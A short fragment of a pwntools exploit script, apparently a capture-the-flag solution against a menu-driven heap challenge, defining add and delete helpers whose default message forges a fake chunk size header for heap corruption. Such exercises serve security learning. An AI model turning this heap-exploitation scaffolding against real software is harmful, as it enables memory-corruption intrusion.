from pwn import *
context(arch='amd64', os='linux', log_level='debug')
def Add(io, size, name, msg=8 * '\x00' + p64(0x71) + '\x00' * 7):
    assert size > 0 and size <= 0x70
    io.sendlineafter("Your choice : ", '1')
    io.sendlineafter("size of the daniu's name: \n", str(size))
    io.sendafter("daniu's name:\n", name)
    io.sendlineafter("daniu's message:\n", msg)
    return io.recvline()
def Delete(io, idx):
    io.sendlineafter("Your choice : ", '3')
    io.sendlineafter("daniu's index:\n", str(idx))
    io.recvline()
